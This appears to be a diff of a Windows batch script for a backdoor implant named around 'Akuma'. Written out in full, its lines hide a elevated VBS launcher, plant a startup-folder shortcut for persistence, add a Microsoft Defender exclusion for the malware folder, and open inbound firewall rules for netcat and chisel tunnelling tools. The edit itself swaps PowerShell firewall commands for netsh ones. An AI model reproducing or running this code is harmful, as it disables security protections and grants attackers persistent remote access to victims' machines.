@@ -14,9 +14,9 @@ echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\Akuma\beyon
 echo objShell.ShellExecute "%homedrive%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %homedrive%\Akuma\beyondbirthday.vbs
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
 echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Akuma\beyondbirthday.bat
-echo powershell Remove-NetFirewallRule -Name "Akumanc" >> %homedrive%\Akuma\beyondbirthday.bat
+echo netsh advfirewall firewall delete rule name="Akumanc" >> %homedrive%\Akuma\beyondbirthday.bat
 echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
-echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %homedrive%\Akuma\beyondbirthday.bat
+echo netsh advfirewall firewall delete rule name="Akumachisel" >> %homedrive%\Akuma\beyondbirthday.bat
 echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
 echo start %homedrive%\Akuma\死神.vbs >> %homedrive%\Akuma\beyondbirthday.bat
 echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
